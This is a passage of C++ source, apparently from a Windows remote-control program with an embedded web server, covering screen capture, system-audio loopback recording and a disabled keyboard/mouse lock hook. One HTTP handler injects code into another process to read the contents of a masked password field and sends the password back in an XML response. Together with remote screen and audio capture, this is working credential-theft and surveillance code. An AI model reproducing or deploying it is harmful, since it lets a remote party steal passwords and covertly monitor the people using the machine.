	BITMAPINFOHEADER bih;
	RECT rect;//get screen size
	if(hWnd==NULL) hWnd = ::GetDesktopWindow(); //getdesktophandle
	::GetWindowRect(hWnd, &rect); //::GetClientRect(hWnd, &rect);
	::memset((void *)&bih,0,sizeof(bih));
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biPlanes = 1;
	bih.biCompression =BI_RGB;
	bih.biBitCount =24;
	bih.biHeight =rect.bottom - rect.top ;
	bih.biWidth =rect.right - rect.left;
	bih.biSizeImage =DIBSCANLINE_WIDTHBYTES(bih.biWidth *bih.biBitCount ) * bih.biHeight ;
	if(bih.biSizeImage>dwbuffer_size)
	{
		if(lpbuffer) ::free(lpbuffer);
		dwbuffer_size=bih.biSizeImage;
		if( (lpbuffer=(LPBYTE)::malloc(dwbuffer_size))==NULL) { dwbuffer_size=0; return 0; }
	}
	
	DWORD dwret=0;
	HDC hWndDC = NULL;
	HDC hMemDC = NULL;
	HBITMAP hMemBmp = NULL;
	HBITMAP hOldBmp = NULL;
	hWndDC = ::GetDCEx(hWnd,NULL,DCX_WINDOW); //::GetDC(hWnd);
	hMemDC = ::CreateCompatibleDC(hWndDC);
	hMemBmp = ::CreateCompatibleBitmap(hWndDC, bih.biWidth, bih.biHeight);
	hOldBmp = (HBITMAP)::SelectObject(hMemDC, hMemBmp);
	::BitBlt(hMemDC, 0, 0, bih.biWidth, bih.biHeight, hWndDC, 0, 0, SRCCOPY);
	
	if(ifCapCursor) //capture mouse cursor
	{
		POINT ptCursor;
		::GetCursorPos(&ptCursor);
		//first get the window handle under the mouse cursor, then get that window's thread ID
		//Attach current thread to the specified window thread
		//get the current mouse cursor handle of that window
		//Deattach
		//!!!if not done this way, calling GetCursor() directly will only get the current thread's cursor handle
		//if not set, the cursor handle retrieved will be the hourglass cursor handle
		HWND hw=::WindowFromPoint(ptCursor);
		if(hw==NULL) hw=hWnd;
		DWORD hdl=::GetWindowThreadProcessId(hw,NULL);
		::AttachThreadInput(::GetCurrentThreadId(),hdl,TRUE);
		HCURSOR hCursor=::GetCursor();
		::AttachThreadInput(::GetCurrentThreadId(),hdl,FALSE);
		ICONINFO IconInfo;//cursor icon data 
		if (::GetIconInfo(hCursor, &IconInfo))
		{
			ptCursor.x -= ((int) IconInfo.xHotspot);
			ptCursor.y -= ((int) IconInfo.yHotspot);
		}
		//draw the cursor on the compatible device context
		::DrawIconEx(
		hMemDC, // handle to device context 
		ptCursor.x, ptCursor.y,
		hCursor, // handle to icon to draw 
		0,0, // width of the icon 
		0, // index of frame in animated cursor 
		NULL, // handle to background brush 
		DI_NORMAL | DI_COMPAT // icon-drawing flags 
		); 
	}//?if(ifCapCursor) //capture mouse cursor
	
	if(::GetDIBits(hWndDC,hMemBmp,0,bih.biHeight,lpbuffer,(LPBITMAPINFO)&bih,DIB_RGB_COLORS))
	{
		//scale down the image
		if(w!=0 && h!=0)
		{
			float f=(float)bih.biWidth/bih.biHeight;
			float f1=(float)w/h;
			if(f1>f) w=(WORD)(h*f); else h=(WORD)(w/f);
			if(w<bih.biWidth && h<bih.biHeight) //scale down the image
			{
				long lEffwidth_src=bih.biSizeImage/bih.biHeight;
				long x,y,lEffwidth_dst=w*3;
				float fX=(float)bih.biWidth/w;
				float fY=(float)bih.biHeight/h;
				LPBYTE ptr,ptrS,ptrD=lpbuffer;
				for(int i=0;i<h;i++)
				{
					ptr=ptrD;
					for(int j=0;j<w;j++)
					{
						//calculate pixel coordinates in the source image
						x=(long)(fX*j); y=(long)(fY*i);
						ptrS = lpbuffer + y * lEffwidth_src + x * 3;
						*ptr++=*ptrS;
						*ptr++=*(ptrS+1);
						*ptr++=*(ptrS+2);
					}
					ptrD+=lEffwidth_dst;
				}
				bih.biWidth=w; bih.biHeight=h;
				bih.biSizeImage=lEffwidth_dst*h;
			}//?if(w<bih.biWidth && h<bih.biHeight)
		}//?if(w!=0 && h!=0)
		//perform JPEG compression
		dwret=cImageF::IPF_EncodeJPEG(&bih,lpbuffer,lpbuffer,quality);
		lpbits=lpbuffer;	
	}//?if(::GetDIBits(hWndDC,

	::SelectObject(hMemDC, hOldBmp);
	::DeleteObject(hMemBmp);
	::DeleteDC(hMemDC);
	::ReleaseDC(hWnd, hWndDC);
	return dwret;
}

//------------------get the password of the specified password window--------------------------------
#include "cInjectDll.h"
typedef HWND (WINAPI *PWindowFromPoint)(POINT);
typedef long (WINAPI *PGetWindowLong)(HWND,int);
typedef BOOL (WINAPI *PPostMessage)(HWND,UINT,WPARAM,LPARAM);
typedef int  (WINAPI *PGetWindowText)(HWND,LPTSTR,int);
typedef struct _TGETPSWDINFO
{
	POINT pt; //current mouse cursor position
	PWindowFromPoint pfnWindowFromPoint;
	PGetWindowLong pfnGetWindowLong;
	PGetWindowText pfnGetWindowText;
	char retPswdBuf[64];
}TGETPSWDINFO;
DWORD WINAPI GetPswdFromWind(INJECTLIBINFO *pInfo)
{
	TGETPSWDINFO *p=(TGETPSWDINFO *)&pInfo->dwParam;
	
	if(p==NULL || p->pfnWindowFromPoint==NULL)
		pInfo->dwReturnValue=3;
	else{
		HWND hWnd=(*p->pfnWindowFromPoint)(p->pt);
		if(hWnd==NULL) pInfo->dwReturnValue=2;
		else{
			long l=(*p->pfnGetWindowLong)(hWnd,GWL_STYLE);
			if((l&ES_PASSWORD)==0) pInfo->dwReturnValue=1; //not a PASSWORD window
			l=(*p->pfnGetWindowText)(hWnd,p->retPswdBuf,sizeof(p->retPswdBuf)-1);
			p->retPswdBuf[l]=0;
		}
	}
	return 0;
}
//get the password of the password window
bool webServer:: httprsp_getpswdfromwnd(socketTCP *psock,httpRequest &httpreq,httpResponse &httprsp,httpSession &session)
{
	const char *ptr; char buf[256];
	RECT rc; TGETPSWDINFO info;
	rc.left=rc.top=0; info.pt.x=info.pt.y=0;
	::memset((void *)&info,0,sizeof(TGETPSWDINFO));
	HWND hwnd=(HWND)atol(session["cap_hwnd"].c_str());
	if(hwnd!=NULL) GetWindowRect(hwnd,&rc);
	if( (ptr=httpreq.Request("x")) ) info.pt.x=atoi(ptr);
	if( (ptr=httpreq.Request("y")) ) info.pt.y=atoi(ptr);
	info.pt.x+=rc.left; info.pt.y+=rc.top;
	
	DWORD dwret,pid=0;
	if( (hwnd=::WindowFromPoint(info.pt)) ) GetWindowThreadProcessId(hwnd,&pid);
	
	//initialize the specified function pointers
	info.pfnGetWindowLong= (PGetWindowLong)GetProcAddress(GetModuleHandle
						("User32.dll"),"GetWindowLongA");	
	info.pfnGetWindowText= (PGetWindowText)GetProcAddress(GetModuleHandle
						("User32.dll"),"GetWindowTextA");
	info.pfnWindowFromPoint= (PWindowFromPoint)GetProcAddress(GetModuleHandle
						("User32.dll"),"WindowFromPoint");
	cInjectDll inject(NULL); //return0 success
	dwret=inject.Call(pid,(PREMOTEFUNC)&GetPswdFromWind,(PVOID)&info,sizeof(TGETPSWDINFO));
	int buflen=sprintf(buf,"<?xml version=\"1.0\" encoding=\"gb2312\" ?>\r\n"
				"<xmlroot>\r\n"
				"<result>%d</result>\r\n"
				"<pid>%d</pid>\r\n"
				"<wtext>%s</wtext>\r\n"
				"</xmlroot>",dwret,pid,info.retPswdBuf);
	
	httprsp.NoCache();//CacheControl("No-cache");
	//set MIME type, default is HTML
	httprsp.set_mimetype(MIMETYPE_XML);
	//set response content length
	httprsp.lContentLength(buflen); 
	httprsp.send_rspH(psock,200,"OK");
	psock->Send(buflen,buf,-1);
	return true;
}

//-------------------------------mouse/keyboard lock------------------------------
/*--------------does not work; must use DLL method for global hook--------------------------
static HHOOK g_hKBLockHook=NULL;//keyboard/mouse lock hook handle
static HHOOK g_hMSLockHook=NULL;

//the following are defined in winuser.h but require #if (_WIN32_WINNT >= 0x0400)
#ifndef LLMHF_INJECTED

#define WH_KEYBOARD_LL 13
#define WH_MOUSE_LL 14
// Structure used by WH_KEYBOARD_LL
typedef struct tagKBDLLHOOKSTRUCT {
    DWORD   vkCode;
    DWORD   scanCode;
    DWORD   flags;
    DWORD   time;
    DWORD   dwExtraInfo;
} KBDLLHOOKSTRUCT, FAR *LPKBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;

// Structure used by WH_MOUSE_LL
typedef struct tagMSLLHOOKSTRUCT {
    POINT   pt;
    DWORD   mouseData;
    DWORD   flags;
    DWORD   time;
    DWORD   dwExtraInfo;
} MSLLHOOKSTRUCT, FAR *LPMSLLHOOKSTRUCT, *PMSLLHOOKSTRUCT;

#endif

//keyboard lock hook handler
LRESULT CALLBACK kbLockProc(
  int nCode,      // hook code
  WPARAM wParam,  // message identifier
  LPARAM lParam   // 
)
{	
	KBDLLHOOKSTRUCT *p=(KBDLLHOOKSTRUCT *)lParam;
	if(p->dwExtraInfo==Wutils::mskbEvent_dwExtraInfo || nCode<0 )
	{
		return CallNextHookEx(g_hKBLockHook,nCode,wParam,lParam);
	}
	return 1;
}
//mouse lock hook handler
LRESULT CALLBACK msLockProc(
  int nCode,      // hook code
  WPARAM wParam,  // message identifier
  LPARAM lParam   // mouse coordinates
)
{	
	MSLLHOOKSTRUCT *p=(MSLLHOOKSTRUCT *)lParam;
	if(p->dwExtraInfo==Wutils::mskbEvent_dwExtraInfo || nCode<0 )
	{
		return CallNextHookEx(g_hMSLockHook,nCode,wParam,lParam);
	}
	return 1;
}

//install or uninstall keyboard/mouse hook
bool SetMouseKeybHook(bool bInstall)
{
	if(bInstall) //install keyboard/mouse hook
	{
		if(g_hKBLockHook || g_hMSLockHook) return true; //already installed
		HMODULE hmdl=GetModuleHandle(NULL);
		printf("aaaaaaaa hmdl=%d, GetLastError=%d \r\n",hmdl,GetLastError());
		g_hKBLockHook=::SetWindowsHookEx(WH_KEYBOARD_LL,kbLockProc,hmdl,0);
		printf("g_hKBLockHook =%d, GetLastError=%d \r\n",g_hKBLockHook,GetLastError());
		g_hMSLockHook=::SetWindowsHookEx(WH_MOUSE_LL,msLockProc,hmdl,0);
		printf("g_hMSLockHook =%d, GetLastError=%d \r\n",g_hMSLockHook,GetLastError());
		if(g_hKBLockHook && g_hMSLockHook) return true;
	}
	//uninstall mouse hook
	if(g_hKBLockHook) UnhookWindowsHookEx(g_hKBLockHook);
	if(g_hMSLockHook) UnhookWindowsHookEx(g_hMSLockHook);
	g_hKBLockHook=NULL; g_hMSLockHook=NULL;
	return (bInstall)?false:true;
}
bool ifInstallMouseKeyHook() { return (g_hKBLockHook || g_hMSLockHook); }
*/

//---------------------------Audio Capture--------------------------------------------
// Case-insensitive substring search helper
static bool nameContainsCI(const char *name, const char *pattern)
{
	size_t plen = strlen(pattern);
	size_t nlen = strlen(name);
	for (size_t i = 0; i + plen <= nlen; i++)
		if (_strnicmp(name + i, pattern, plen) == 0) return true;
	return false;
}

// Try to find a loopback (stereo mix / wave out mix) recording device.
// Returns WAVE_MAPPER if no loopback device is found.
static UINT findLoopbackDevice(WAVEFORMATEX *pwfx)
{
	UINT nDevs = waveInGetNumDevs();
	for (UINT i = 0; i < nDevs; i++)
	{
		WAVEINCAPS caps;
		if (waveInGetDevCaps(i, &caps, sizeof(caps)) == MMSYSERR_NOERROR)
		{
			// Match only well-known loopback device name substrings
			// (case-insensitive, precise to avoid matching non-loopback devices)
			if (nameContainsCI(caps.szPname, "Stereo Mix")  ||
			    nameContainsCI(caps.szPname, "What U Hear") ||
			    nameContainsCI(caps.szPname, "Wave Out Mix") ||
			    nameContainsCI(caps.szPname, "Loopback"))
			{
				// WAVE_FORMAT_QUERY only validates format support; it does not
				// open the device and does not set the handle (phwi is ignored).
				if (waveInOpen(NULL, i, pwfx, 0, 0, WAVE_FORMAT_QUERY) == MMSYSERR_NOERROR)
					return i;
			}
		}
	}
	return WAVE_MAPPER;
}

// Convert a 32-bit float sample to a 16-bit signed integer sample.
static inline short floatToS16(float f)
{
	if (f >  1.0f) f =  1.0f;
	if (f < -1.0f) f = -1.0f;
	return (short)(f * 32767.0f);
}

// Return true if the WAVEFORMATEX (or WAVEFORMATEXTENSIBLE) describes IEEE-float samples.
static bool wfxIsFloat(const WAVEFORMATEX *pwfx)
{
	if (pwfx->wFormatTag == WAVE_FORMAT_IEEE_FLOAT) return true;
	if (pwfx->wFormatTag == WAVE_FORMAT_EXTENSIBLE)
	{
		// KSDATAFORMAT_SUBTYPE_IEEE_FLOAT = {00000003-0000-0010-8000-00AA00389B71}
		static const GUID GUID_IEEE_FLOAT =
			{ 0x00000003, 0x0000, 0x0010,
			  { 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71 } };
		const WAVEFORMATEXTENSIBLE *pExt =
			reinterpret_cast<const WAVEFORMATEXTENSIBLE *>(pwfx);
		return (IsEqualGUID(pExt->SubFormat, GUID_IEEE_FLOAT) != 0);
	}
	return false;
}

// Capture ~500 ms of rendered audio using WASAPI loopback (Windows Vista and later).
// Converts the device's native format to 16-bit stereo PCM on the fly.
// On success, sets *pwfxOut and returns the number of PCM bytes written to lpPCMOut.
// Returns 0 on any failure (caller then falls back to WinMM).
static DWORD capAudioWASAPI(LPBYTE lpPCMOut, DWORD dwMaxBytes, WAVEFORMATEX *pwfxOut)
{
	DWORD  dwResult   = 0;
	HRESULT hr;
	IMMDeviceEnumerator *pEnum    = NULL;
	IMMDevice           *pDev     = NULL;
	IAudioClient        *pClient  = NULL;
	IAudioCaptureClient *pCapture = NULL;
	WAVEFORMATEX        *pDevFmt  = NULL;

	// Initialize COM for this call.
	// S_OK  = freshly initialized → we must call CoUninitialize() on the way out.
	// S_FALSE = already initialized on this thread → do NOT call CoUninitialize().
	HRESULT hrCom    = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	bool    bNeedCo  = (hrCom == S_OK);

	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL,
	                      __uuidof(IMMDeviceEnumerator), (void **)&pEnum);
	if (FAILED(hr)) goto done;

	hr = pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDev);
	if (FAILED(hr)) goto done;

	hr = pDev->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void **)&pClient);
	if (FAILED(hr)) goto done;

	hr = pClient->GetMixFormat(&pDevFmt);
	if (FAILED(hr)) goto done;

	// Initialize in loopback mode: captures whatever the render endpoint is playing.
	hr = pClient->Initialize(AUDCLNT_SHAREMODE_SHARED,
	                         AUDCLNT_STREAMFLAGS_LOOPBACK,
	                         5000000, 0, pDevFmt, NULL); // 500 ms buffer (100-ns units)
	if (FAILED(hr)) goto done;

	hr = pClient->GetService(__uuidof(IAudioCaptureClient), (void **)&pCapture);
	if (FAILED(hr)) goto done;

	if (FAILED(pClient->Start())) goto done;

	{
		bool   bFloat  = wfxIsFloat(pDevFmt);
		UINT32 nSrcCh  = pDevFmt->nChannels;
		UINT32 nDstCh  = (nSrcCh >= 2) ? 2 : 1;
		UINT32 nBPS    = pDevFmt->wBitsPerSample;
		UINT32 nBPCh   = nBPS / 8;
		UINT32 nBlkSz  = pDevFmt->nBlockAlign;
		UINT32 nPktLen = 0;

		// Poll for ~2 seconds in 10 ms steps to keep the device buffer drained
		// and collect as much audio as the output buffer can hold.
		ULONGLONG dwEndTick = GetTickCount64() + 2000;
		do
		{
			Sleep(10);
			while (SUCCEEDED(pCapture->GetNextPacketSize(&nPktLen)) && nPktLen > 0)
			{
				BYTE  *pData   = NULL;
				UINT32 nFrames = 0;
				DWORD  dwFlags = 0;
				if (FAILED(pCapture->GetBuffer(&pData, &nFrames, &dwFlags, NULL, NULL)))
					break;

				bool bSilent = ((dwFlags & AUDCLNT_BUFFERFLAGS_SILENT) != 0) || (pData == NULL);
				for (UINT32 f = 0; f < nFrames && dwResult + sizeof(short) * nDstCh <= dwMaxBytes; f++)
				{
					for (UINT32 c = 0; c < nDstCh; c++)
					{
						short s = 0;
						if (!bSilent)
						{
							// Clamp source channel index to the number of available channels
							UINT32 srcC = (c < nSrcCh) ? c : (nSrcCh - 1);
							const BYTE *pSrc = pData + (size_t)f * nBlkSz + (size_t)srcC * nBPCh;
							if (bFloat && nBPS == 32)
							{
								float fv; memcpy(&fv, pSrc, 4);
								s = floatToS16(fv);
							}
							else if (!bFloat && nBPS == 16)
							{
								memcpy(&s, pSrc, 2);
							}
							else if (!bFloat && nBPS == 32)
							{
								INT32 i32; memcpy(&i32, pSrc, 4);
								s = (short)(i32 >> 16);
							}
						}
						memcpy(lpPCMOut + dwResult, &s, sizeof(short));
						dwResult += sizeof(short);
					}
				}
				pCapture->ReleaseBuffer(nFrames);
				if (dwResult >= dwMaxBytes) break;
			}
		} while (GetTickCount64() < dwEndTick && dwResult < dwMaxBytes);
	}

	pClient->Stop();

	if (dwResult > 0)
	{
		memset(pwfxOut, 0, sizeof(WAVEFORMATEX));
		pwfxOut->wFormatTag      = WAVE_FORMAT_PCM;
		pwfxOut->nChannels       = (pDevFmt->nChannels >= 2) ? 2 : 1;
		pwfxOut->nSamplesPerSec  = pDevFmt->nSamplesPerSec;
		pwfxOut->wBitsPerSample  = 16;
		pwfxOut->nBlockAlign     = pwfxOut->nChannels * 2;
		pwfxOut->nAvgBytesPerSec = pwfxOut->nSamplesPerSec * pwfxOut->nBlockAlign;
	}

done:
	if (pCapture) pCapture->Release();
	if (pClient)  pClient->Release();
	if (pDevFmt)  CoTaskMemFree(pDevFmt);
	if (pDev)     pDev->Release();
	if (pEnum)    pEnum->Release();
	if (bNeedCo)  CoUninitialize();
	return dwResult;
}

// Capture ~2 s of system audio and return it as a WAV (RIFF/PCM) response.
// Audio format: 44100 Hz, 16-bit, stereo (or device native rate if WASAPI is used).
bool webServer::httprsp_capAudio(socketTCP *psock, httpResponse &httprsp)
{
	// Maximum PCM buffer: 2 seconds at 48000 Hz / 16-bit / 2ch = 384 KB
	const DWORD dwMaxPCM  = 48000 * 2 * 2 * 2;
	// WAV header is 44 bytes (RIFF chunk + fmt chunk + data chunk header)
	const DWORD dwHdrSize = 44;
	DWORD dwTotalSize = dwHdrSize + dwMaxPCM;

	LPBYTE lpBuffer = (LPBYTE)malloc(dwTotalSize);
	if (!lpBuffer)
	{
		httprsp.set_mimetype(MIMETYPE_HTML);
		httprsp.lContentLength(0);
		httprsp.send_rspH(psock, 500, "Internal Server Error");
		return true;
	}

	WAVEFORMATEX wfx;
	DWORD dwCaptured = 0;

	// --- Try WASAPI loopback first (Vista+, no "Stereo Mix" device required) ---
	dwCaptured = capAudioWASAPI(lpBuffer + dwHdrSize, dwMaxPCM, &wfx);

	// --- Fall back to WinMM loopback (requires "Stereo Mix" or equivalent) ---
	if (dwCaptured == 0)
	{
		memset(&wfx, 0, sizeof(wfx));
		wfx.wFormatTag      = WAVE_FORMAT_PCM;
		wfx.nChannels       = 2;
		wfx.nSamplesPerSec  = 44100;
		wfx.wBitsPerSample  = 16;
		wfx.nBlockAlign     = wfx.nChannels * wfx.wBitsPerSample / 8;
		wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
		wfx.cbSize          = 0;

		UINT nDevice = findLoopbackDevice(&wfx);
		if (nDevice != WAVE_MAPPER) // only attempt capture if a loopback device was found
		{
			// 2000 ms worth of PCM samples
			DWORD dwPCMSize = wfx.nAvgBytesPerSec * 2;
			if (dwPCMSize > dwMaxPCM) dwPCMSize = dwMaxPCM;

			HANDLE  hEvent  = CreateEvent(NULL, FALSE, FALSE, NULL);
			HWAVEIN hWaveIn = NULL;

			if (hEvent &&
			    waveInOpen(&hWaveIn, nDevice, &wfx, (DWORD_PTR)hEvent, 0, CALLBACK_EVENT) == MMSYSERR_NOERROR)
			{
				WAVEHDR waveHdr;
				memset(&waveHdr, 0, sizeof(WAVEHDR));
				waveHdr.lpData         = (LPSTR)(lpBuffer + dwHdrSize);
				waveHdr.dwBufferLength = dwPCMSize;

				if (waveInPrepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR)) == MMSYSERR_NOERROR)
				{
					waveInAddBuffer(hWaveIn, &waveHdr, sizeof(WAVEHDR));
					waveInStart(hWaveIn);
					// Wait up to 3 s for the 2-second buffer to be filled
					if (WaitForSingleObject(hEvent, 3000) == WAIT_OBJECT_0)
						dwCaptured = waveHdr.dwBytesRecorded;
					waveInStop(hWaveIn);
					waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
				}
				waveInClose(hWaveIn);
			}
			if (hEvent) CloseHandle(hEvent);
		}
	}

	DWORD dwSendSize = 0;
	if (dwCaptured > 0)
	{
		// Build the 44-byte WAV / RIFF header in place
		LPBYTE p = lpBuffer;
		DWORD  tmp;

		memcpy(p, "RIFF", 4); p += 4;
		tmp = 36 + dwCaptured;             // RIFF chunk size
		memcpy(p, &tmp, 4);   p += 4;
		memcpy(p, "WAVE", 4); p += 4;
		memcpy(p, "fmt ", 4); p += 4;
		tmp = 16;                           // fmt chunk size (PCM)
		memcpy(p, &tmp, 4);   p += 4;
		memcpy(p, &wfx, 16);  p += 16;     // WAVEFORMATEX without cbSize
		memcpy(p, "data", 4); p += 4;
		memcpy(p, &dwCaptured, 4);          // data chunk size

		dwSendSize = dwHdrSize + dwCaptured;
	}

	httprsp.NoCache();
	if (dwSendSize > 0)
	{
		httprsp.Header()["Content-Type"] = "audio/wav";
		httprsp.lContentLength(dwSendSize);
		httprsp.send_rspH(psock, 200, "OK");
		psock->Send(dwSendSize, (const char*)lpBuffer, -1);
	}
	else
	{
		httprsp.set_mimetype(MIMETYPE_HTML);
		httprsp.lContentLength(0);
		httprsp.send_rspH(psock, 200, "OK");
	}

	free(lpBuffer);
	return true;
}